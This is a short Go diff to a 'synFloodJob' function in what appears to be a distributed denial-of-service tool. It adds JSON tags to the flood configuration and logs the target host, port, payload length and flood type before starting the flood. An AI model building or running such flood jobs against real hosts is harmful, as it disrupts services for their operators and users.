@@ -212,8 +212,8 @@ func synFloodJob(ctx context.Context, args JobArgs) error {
 		BasicJobConfig
 		Host          string
 		Port          int
-		PayloadLength int
-		FloodType     string
+		PayloadLength int    `json:"payload_len"`
+		FloodType     string `json:"flood_type"`
 	}
 	var jobConfig synFloodJobConfig
 	err := json.Unmarshal(args, &jobConfig)
@@ -226,6 +226,7 @@ func synFloodJob(ctx context.Context, args JobArgs) error {
 		<-ctx.Done()
 		shouldStop <- true
 	}()
+	log.Println("sending syn flood with params:", jobConfig.Host, jobConfig.Port, jobConfig.PayloadLength, jobConfig.FloodType)
 	return synfloodraw.StartFlooding(shouldStop, jobConfig.Host, jobConfig.Port, jobConfig.PayloadLength, jobConfig.FloodType)
 }
 
